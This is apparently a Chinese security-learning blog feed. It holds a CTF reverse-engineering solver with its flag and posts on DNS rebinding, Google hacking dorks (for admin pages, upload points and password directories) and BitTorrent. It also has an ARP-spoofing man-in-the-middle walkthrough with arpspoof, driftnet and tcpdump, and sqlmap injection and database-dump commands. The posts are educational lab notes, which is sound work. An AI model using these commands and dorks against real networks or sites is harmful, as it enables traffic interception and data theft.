sub_1400180A0(<span class="number">0</span>i64);</span><br><span class="line">  srand(v12);</span><br><span class="line">  v15 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">7</span> || v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      *a10 += v18 * v15;</span><br><span class="line">      v15 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = rand() % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j != <span class="number">7</span> || v20 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j )</span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) += v20 * v16;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_QWORD *)(a12 + <span class="number">8</span>i64 * *a11) = v20;</span><br><span class="line">      v16 *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_1400112E9(<span class="string">&quot;%s %d\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)a3, *(_QWORD *)(a12 + <span class="number">8</span>i64 * (*a11)++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的flag在v14变量中，是根据已有的变量变换得到的</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span></span><br><span class="line">v4 = <span class="string">&quot;You&#x27;re our first customer!&quot;</span></span><br><span class="line">v5 = <span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span></span><br><span class="line">v6 = <span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span></span><br><span class="line">v7 = <span class="string">&quot;1.buy a lottery ticket&quot;</span></span><br><span class="line">v8 = <span class="string">&quot;2.Check to see if you won&quot;</span></span><br><span class="line">v9 = <span class="string">&quot;3.join us&quot;</span></span><br><span class="line">v10 = <span class="string">&quot;4.Take a sneak peek at the flag&quot;</span></span><br><span class="line">v11 = <span class="string">&quot;5.exit&quot;</span></span><br><span class="line">v13 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>]</span><br><span class="line">v15 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line">v14 = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">V14 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">V14[<span class="number">9</span>] = v7[<span class="number">0</span>]</span><br><span class="line">V14[<span class="number">2</span>] = V14[<span class="number">9</span>]</span><br><span class="line">V14[<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v3[<span class="number">10</span>])<span class="number">-12</span>)</span><br><span class="line">V14[<span class="number">10</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">5</span>]) - <span class="number">56</span>)</span><br><span class="line">V14[<span class="number">7</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v8[<span class="number">15</span>]) - <span class="number">10</span>)</span><br><span class="line">V14[<span class="number">13</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v10[<span class="number">3</span>]) + <span class="number">3</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">3</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v4[<span class="number">1</span>]) + <span class="number">4</span>)</span><br><span class="line">V14[<span class="number">11</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v9[<span class="number">7</span>])<span class="number">-14</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">4</span>] = (V14[<span class="number">7</span>])</span><br><span class="line">V14[<span class="number">0</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v11[<span class="number">0</span>])+<span class="number">31</span>).lower()<span class="comment">#l</span></span><br><span class="line">V14[<span class="number">8</span>] = (v10[<span class="number">27</span>]).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">5</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v6[<span class="number">13</span>])<span class="number">-16</span>).upper()<span class="comment">#</span></span><br><span class="line">V14[<span class="number">6</span>] = V14[<span class="number">3</span>]</span><br><span class="line">V14[<span class="number">12</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[<span class="number">6</span>])<span class="number">-39</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(V14))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;th1s_Is_F14G:D&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS重绑定</title>
      <link href="2022/04/17/dns_rebinding_attack/"/>
      <url>2022/04/17/dns_rebinding_attack/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>DNS重绑定指的是在用户访问域名时更改域名指向的IP从而令用户访问指定IP的攻击手法</p><hr><p><strong>DNS</strong>：由于网络传输需要IP地址，故需要DNS（Domian Name Server）用于查询给定域名指向的IP</p><p><strong>同源策略</strong>（The Same-origin Policy）：</p><blockquote><p>The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins.</p><p>The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or <a href="http://www.thinkfu.com/blog/?p=15">JavaScript/gif polyglots</a>). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses.</p></blockquote><p>以上解释来自于<a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a></p><p><a href="https://www.helloimg.com/image/RnPgwo"><img src="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/17/RnPgwo.png" srcset="data:image/png;base64,666" alt="RnPgwo.png"></a></p><p>简单来说，为了防止淘宝网带着你的账户信息访问京东，需要同源策略来限制不同网站之间的访问规范</p><hr><p>​    可以看出同源的要求是“协议+端口+域名/ip”，而如果以域名访问网站（通常的做法）时同源策略就变成了“协议+端口+域名”这就给了DNS重绑定攻击实现的可能</p><p>要实现DNS重绑定攻击，攻击者需要具备以下条件：</p><ul>    <li>诱使用户点击给定链接（钓鱼邮件、钓鱼短信、社工等）</li>    <li>可控的DNS服务器（自己搭建一个或者抢一个）</li></ul><p>​    DNS重绑定攻击会诱使用户访问一个域名，在用户第一次访问时以正常的IP进行通信，并且在返回的DNS查询结果中将TTL设置为1或其他比较小的数字，在诱使用户以点击等行为构造好恶意请求时，攻击者一般会修改DNS服务器上该域名指向的IP，从而将恶意请求发送至攻击者指定的IP；</p><blockquote><p>TTL（Time To Live）指的是dns查询结果的有效时间，通过修改TTL为一个较小的值从而实现受害者与DNS服务器的频繁通信，从而保证在修改域名指向的IP时能立即生效</p></blockquote><hr><p>​    易受攻击的设备：一般是位于内网的智能家居设备，由于攻击者无法从外网访问受害者的内网，故以此种攻击伪造身份访问内网（SSRF）；比如恒温器，若在一个只有老人的场所中，这种攻击往往是致命的</p><blockquote><p>quote<br><a href="https://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy - Web Security (w3.org)</a><br><a href="https://zhuanlan.zhihu.com/p/45583472">利用DNS重绑定攻击专用网络 - 知乎 (zhihu.com)</a><br><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击 - 先知社区 (aliyun.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking</title>
      <link href="2022/04/09/google_hacking/"/>
      <url>2022/04/09/google_hacking/</url>
      
        <content type="html"><![CDATA[<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>Google hacking是一系列用于高效运用搜索引擎的技巧，也可以用于测试漏洞等用处</p><p>A and B</p><p>逻辑与，用于查找同时包含A和B的内容</p><p>A or B</p><p>逻辑或，用于查找包含A或包含B或同时包含A和B的内容</p><p>A -B</p><p>逻辑非，用于查找A但不包含B的内容</p><p>“xxx yyy”</p><p>完整匹配，用于查找带有完整xxx yyy的内容</p><p>site:xxx.com yyy</p><p>指定搜索范围，用于搜索特定范围（xxx.com）内有关yyy的内容</p><p>filetype:txt xxx</p><p>指定搜索文件类型，用于搜索有关xxx的txt文件</p><p>inurl:aaa</p><p>搜索匹配网址中带aaa的内容</p><p>allinurl: aaa bbb</p><p>与inurl相似，只不过可以指定多个关键词</p><p>intext:aaa xxx</p><p>搜索匹配网页正文中带aaa的且有关xxx的内容</p><p>intitle:xxx</p><p>搜索匹配网页的标题中包含xxx的内容</p><p>xxx*</p><p>使用通配符*搜索有关以xxx为前缀的内容</p><p>link:xxx.com</p><p>返回所有指向xxx.com的网页</p><p>related:xxx.com</p><p>返回所有与xxx.com相似的网页（指布局相似）</p><p>cache:xxx.com [yyy]</p><p>返回搜索引擎有关xxx.com的缓存，如果加上关键词，则网页中的关键词会被高亮</p><p>info:<a href="http://www.xxx.com/">www.xxx.com</a></p><p>返回有关站点<a href="http://www.xxx.com的相关信息/">www.xxx.com的相关信息</a></p><p>define:xxx</p><p>返回有关xxx的定义</p><p>Index of /xxx</p><p>返回允许当作目录访问的网页</p><h2 id="一些技巧："><a href="#一些技巧：" class="headerlink" title="一些技巧："></a>一些技巧：</h2><h3 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h3><p>site:xx.com intext:管理</p><p>site:xx.com inurl:login</p><p>site:xx.com intitle:后台</p><h3 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h3><p>site:xx.com filetype:asp</p><p>site:xx.com filetype:php</p><p>site:xx.com filetype:jsp</p><p>site:xx.com filetype:aspx</p><h3 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h3><p>site:xx.com inurl:file</p><p>site:xx.com inurl:load</p><h3 id="查看可访问目录"><a href="#查看可访问目录" class="headerlink" title="查看可访问目录"></a>查看可访问目录</h3><p>index of /admin</p><p>index of /passwd</p><p>index of /password</p><p>index of /mail</p><p>“index of /“ +passwd</p><p>“index of /“ +password.txt</p><p>“index of /“ +.htaccess</p><p>“index of /root”</p><p>“index of /cgi-bin”</p><p>“index of /logs”</p><p>“index of /config”</p><blockquote><p>quote<br><a href="https://blog.csdn.net/weixin_51339377/article/details/124005136">Google-Hacking 语法笔记_Simon_Smith的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/105258082">2-信息收集—Google hacking_songly_的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">信息收集之Google Hacking的简单用法_谢公子的博客-CSDN博客_google hacking</a></p><p><a href="https://blog.csdn.net/huweiliyi/article/details/105442118">Google Hacking使用详解_Teacher.Hu的博客-CSDN博客_google hacking</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp欺骗初次尝试</title>
      <link href="2022/04/03/arp_cheat/"/>
      <url>2022/04/03/arp_cheat/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP欺骗是什么"><a href="#ARP欺骗是什么" class="headerlink" title="ARP欺骗是什么"></a>ARP欺骗是什么</h2><p>ARP欺骗（ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E7%BD%91">以太网</a><a href="https://baike.baidu.com/item/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">地址解析协议</a>（<a href="https://baike.baidu.com/item/ARP">ARP</a>）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。</p><p>以上来自百度百科</p><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>大概原理就是在每台用于上网的机器中都会有一张叫arp缓存表的东西，里边记录了ip地址与mac地址（物理地址）的映射关系</p><p>这张表的形成过程如下：</p><p>假设现在我要与ip地址为192.168.1.2的主机通信，我就向局域网内的所有主机广播消息“谁是192.168.1.2 ？”，这时如果该ip的主机收到了广播，就会向发出广播的主机回应“192.168.1.2是我，我的mac地址是xxx”，然后发出广播的主机就将该ip和该mac地址记录到本机的arp缓存表中</p><p>而arp欺骗要做的，就是假装自己是某一台被请求的主机，把自己的mac地址与被假装主机的ip绑定起来记录在别人的arp缓存表中；由于网络的实际传输是通过mac地址进行寻址的，这样所有发送到被假装主机的信息都会通过mac地址发送到恶意主机上</p><h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><p>设备：手机一台，电脑一台，树莓派一个</p><p>说明：</p><ul>    <li>手机充当受害者（ip：192.168.137.116）</li>    <li>电脑充当网关（开热点 ip：192.168.137.1）</li>    <li>树莓派作为攻击机器（ip：192.168.137.66）</li></ul><p>使用程序：arpspoof(需要安装dsniff与ssldump)，tcpdump，driftnet</p><blockquote><p>为什么需要树莓派？</p><p>本来打算用vmware模拟所有的主机的，但是由于局域网的配置问题无法用vmware模拟所有机器，模拟一部分的话又会因为局域网的问题导致虚拟机与物理机无法进行正常通信，所以就拿出了我吃灰多年的原生树莓派</p></blockquote><p>首先使用nmap扫描受害者</p><p><a href="https://www.helloimg.com/image/RJkmoX"><img src="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkmoX.png" srcset="data:image/png;base64,666" alt="RJkmoX.png"></a></p><p>确定了受害者的ip之后使用命令</p><p>arpspoof -i [网卡（此处为wlan0）] -t [目标ip] [网关ip]</p><p>进行欺骗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1</span><br></pre></td></tr></table></figure><p>如果仅仅只是想对目标主机进行断网操作的话无需其他操作，但是如果想进行双向的欺骗（中间人攻击），就必须打开树莓派的转发功能，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>然后再打开另一个窗口，安装driftnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install driftnet</span><br><span class="line">sudo driftnet -i [监听网卡] -a -d [截取的图片的存放目录]</span><br></pre></td></tr></table></figure><p>这样就可以获取受害者此时的图片了</p><p><a href="https://www.helloimg.com/image/RJkHXz"><img src="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkHXz.png" srcset="data:image/png;base64,666" alt="RJkHXz.png"></a></p><blockquote><p>如果用树莓派查看图片不方便，可以打开80端口，把图片放到网站根目录下再从浏览器访问</p></blockquote><p>实际上在我进行实验时，截图获取得并不是很顺利，所以我选择了另外一种获取通信信息的方式——tcpdump</p><p>在arpspoof命令运行的时候，由于受害者与网关的所有通信都会经过攻击机的网卡，故我们可以用tcpdump来获取本地网卡接收到的信息。命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i wlan0 -s 0 -w e.cap</span><br></pre></td></tr></table></figure><p>wlan0是网卡，e.cap是抓包存放的文件名称，回车之后便开始抓包，等到什么时候觉得差不多了就crtl+C停止就行，此时在当前目录下应该会出现刚刚抓包的文件（此处为e.cap），可以使用以下命令读取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -A -r e.cap </span><br></pre></td></tr></table></figure><p>-A是以ascii形式显示 -r后面的是要打开的文件，除了这种打开方式，还有类似过滤器的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n dst host 119.91.135.95 -r e.cap</span><br></pre></td></tr></table></figure><p>该命令过滤了ip为119.91.135.95的通信信息并显示在屏幕上</p><p><a href="https://www.helloimg.com/image/RJkDzS"><img src="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/04/03/RJkDzS.png" srcset="data:image/png;base64,666" alt="RJkDzS.png"></a></p><p>以上是传输过程中截取的信息</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97/2805503">ARP欺骗_百度百科 (baidu.com)</a></p><p><a href="https://www.cnblogs.com/longliz/p/15040093.html">kaili linux使用arpspoof进行arp欺骗 - 闻所未闻 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mr__sheng/article/details/123757426">ARP–利用arpspoof和driftnet工具进行arp欺骗_mr_xiuk的博客-CSDN博客_arpspoof</a></p><p><a href="https://blog.51cto.com/u_14354846/2408291">kali linux操作系统中TCPDUMP详细使用方法_隔壁老湿的技术博客_51CTO博客</a></p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/104569308">Kali渗透-ARP断网攻击与监听_Tr0e的博客-CSDN博客_kali局域网渗透监控</a></p><p><a href="https://www.cnblogs.com/0day-li/p/6059297.html">kali linux下的arp攻击 - 逗比大师 - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Internet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap基本操作</title>
      <link href="2022/03/29/sqlmap/"/>
      <url>2022/03/29/sqlmap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.helloimg.com/image/RqDeM6"><img src="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/29/RqDeM6.png" srcset="data:image/png;base64,666" alt="RqDeM6.png"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux-Mac-OS"><a href="#Linux-Mac-OS" class="headerlink" title="Linux / Mac OS"></a>Linux / Mac OS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>安装git-bash之后在选定目录下右键打开git-bash窗口运行上述命令即可</p><p>下载地址：</p><p><a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -h<span class="comment"># 获取常见选项</span></span><br><span class="line">python sqlmap.py -hh<span class="comment"># 获取所有选项</span></span><br><span class="line">python sqlmap.py -u www.example.com <span class="comment"># 检测GET注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch  <span class="comment"># 使用默认选项（不用手动选择y/n）</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dbs --tables --columns<span class="comment"># 返回数据库/表/列</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx<span class="comment"># 指定数据库/表/列</span></span><br><span class="line">python sqlmap.py -u www.example.com --batch --dump   <span class="comment"># 直接返回数据库内容</span></span><br></pre></td></tr></table></figure><p><strong>注：如果是在Linux系统下，python命令可能调用的是python2，如果报错可将python换为python3</strong></p><p>​        <strong>如果有其他报错，尝试将网址等参数用双引号包裹</strong></p><p>​        <strong>Windows下可在命令提示符或powershell下运行</strong></p><ul>    <li>在返回数据库/表/列时，可只指定一项</li>    <li>在指定数据库/表/列时，也可只指定一项</li>    <li>一般将dump选项和上述命令结合，直接返回注入结果</li></ul><h2 id="更多玩法"><a href="#更多玩法" class="headerlink" title="更多玩法"></a>更多玩法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m 1.txt<span class="comment"># 从文件中导入url</span></span><br><span class="line">python sqlmap.py -r res.txt<span class="comment"># 从文件中导入http响应</span></span><br><span class="line">python sqlmap.py -l burp.txt<span class="comment"># 从文件中导入burp抓包文件</span></span><br><span class="line">python sqlmap.py -u www.example.com  --data=<span class="string">&quot;id=1&quot;</span>  <span class="comment"># 使用POST注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 2  <span class="comment"># 使用2级注入，检测cookie注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 3  <span class="comment"># 使用3级注入，检测referer注入和USER-AGENT注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --level 5  <span class="comment"># 使用5级注入，检测host注入</span></span><br><span class="line">python sqlmap.py -u www.example.com --random-agent     <span class="comment"># 使用随机代理</span></span><br><span class="line">python sqlmap.py -u www.example.com --tor  <span class="comment"># 使用匿名tor网络</span></span><br><span class="line">python sqlmap.py -u www.example.com --hpp  <span class="comment"># 检测http污染</span></span><br></pre></td></tr></table></figure><p>level默认为1，范围为 1 - 5</p><p><strong>更多用法和命令可参照官网文档：<a href="http://sqlmap.org/">http://sqlmap.org/</a></strong></p><blockquote><p>quote<br><a href="https://github.com/sqlmapproject/sqlmap">GitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool</a></p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap</a></p><p><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关BT种子的一些事</title>
      <link href="2022/03/27/bit_torrent/"/>
      <url>2022/03/27/bit_torrent/</url>
      
        <content type="html"><![CDATA[<h2 id="Bit-Torrent-BT种子-是什么？"><a href="#Bit-Torrent-BT种子-是什么？" class="headerlink" title="Bit Torrent (BT种子)是什么？"></a>Bit Torrent (BT种子)是什么？</h2><blockquote><p>BitTorrent(简称BT)是一个文件分发协议，每个下载者在下载的同时不断向其他下载者上传已下载的数据。而在<a href="https://baike.baidu.com/item/FTP/13839">FTP</a>,<a href="https://baike.baidu.com/item/HTTP">HTTP</a>协议中，每个下载者在下载自己所需文件的同时，各个下载者之间没有交互。当非常多的用户同时访问和下载服务器上的文件时，由于FTP服务器处理能力和带宽的限制，下载速度会急剧下降，有的用户可能访问不了服务器。BT协议与FTP协议不同，特点是下载的人越多，下载速度越快，原因在于每个下载者将已下载的数据提供给其他下载者下载，充分利用了用户的上载带宽。通过一定的策略保证上传速度越快，下载速度也越快。在很短时间内，BitTorrent协议成为一种新的变革技术。</p></blockquote><p>以上说明来自百度百科</p><p><a href="https://www.helloimg.com/image/RexTrb"><img src="https://www.helloimg.com/images/2022/03/27/RexTrb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/27/RexTrb.png" srcset="data:image/png;base64,666" alt="RexTrb.png"></a></p><p>用通俗的话讲，BT种子（以下简称 种子 ）技术其实就是将一个比较大的文件（比如电影或镜像）按照一定的规范分成多个块，当用户通过.torrent文件下载时，会连接上种子文件中记录的tracker服务器，而tracker服务器并不提供文件本身，而是通过查询返回当前同在下载该文件的其他客户端的地址，而主机接收到该地址后，会逐个逐个尝试连接，连接成功的便通过点对点（P2P）的方式获取对方计算机上的另一部分文件，然后再连接其他的客户端，获取文件的其他部分</p><h2 id="Bit-Torrent-与其他下载方式相比，有什么优势？"><a href="#Bit-Torrent-与其他下载方式相比，有什么优势？" class="headerlink" title="Bit Torrent 与其他下载方式相比，有什么优势？"></a>Bit Torrent 与其他下载方式相比，有什么优势？</h2><p>不同于传统的 C/S ( Client / Server )模式，P2P的下载方式避免了单个服务器提供多个客户端的服务时带宽负载大的问题；在P2P下载时，每一台计算机，既是客户端，又是服务端，在下载的过程中，也向其他有需要的客户端上传自己的文件，有效节省了带宽；</p><p>另外，由于P2P去中心化的特点，每个处于BT网络中的文件，其存在与否不再取决于文件的提供者或服务商，在一定程度上避免了文件因个人过失而永久消失的情况</p><h2 id="Bit-Torrent-与其他下载方式相比，有什么劣势？"><a href="#Bit-Torrent-与其他下载方式相比，有什么劣势？" class="headerlink" title="Bit Torrent 与其他下载方式相比，有什么劣势？"></a>Bit Torrent 与其他下载方式相比，有什么劣势？</h2><p>有优势就肯定有劣势，如上文所说，BT下载是通过同在下载该文件的其他客户端提供的服务来获取文件的，那么，当同时在下载该文件的客户端很少，甚至我们可以假设一种极端情况：整个网络就只有你一台计算机在下载该文件，那么你将不会得到你想要的文件，因为没有其他节点给你提供你想要的文件</p><p>另一方面，同样由于BT技术中文件无法轻易清除的特点，文件一旦上传，想永久抹去的可能性不大，那么万一有不法分子上传了本不该出现在网络上的文件（比如有关国家机密或者个人隐私，有或者未上映的电影之类的），其后果不堪设想</p><h2 id="torrent文件都记录了什么？"><a href="#torrent文件都记录了什么？" class="headerlink" title="torrent文件都记录了什么？"></a>torrent文件都记录了什么？</h2><p>A）这个文件（文件夹）中数据的SHA1值，比如一个1G的文件，如果按1M每块进行分块，则会被分为了1000块，torrent中就会有这1000个数据块的指纹值（SHA1的<a href="https://www.zhihu.com/search?q=hash%E5%80%BC&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:160765176%7D">hash值</a>），这个占据了torrent文件的绝大部分空间。这些值的目的是为了下载的过程中进行数据校验，确保数据收到的和当时源头制作torrent时的源文件100%一致，防止恶意数据攻击。</p><p>B）一般制作torrent文件时，还会要指定一个或者多个Tracker的地址，比如<a href="https://link.zhihu.com/?target=http://www.a.com:8080/announce">http://www.a.com:8080/announce</a>这种地址。torrent里面一般也会存储了这个信息，这个其实也尤为重要。相当于记录了一个问询服务器的地址，这个问询服务器的作用，后面我再解释。</p><p>C）文件或者文件夹内每个文件的名字，方便下载文件时，磁盘上直接命名好跟原始数据一样的目录结构、文件名。    </p><p>D）其它一些辅助和可扩展的信息，比如可以配置一个P2SP的http地址辅助下载，比如制作软件的名字、备注……。      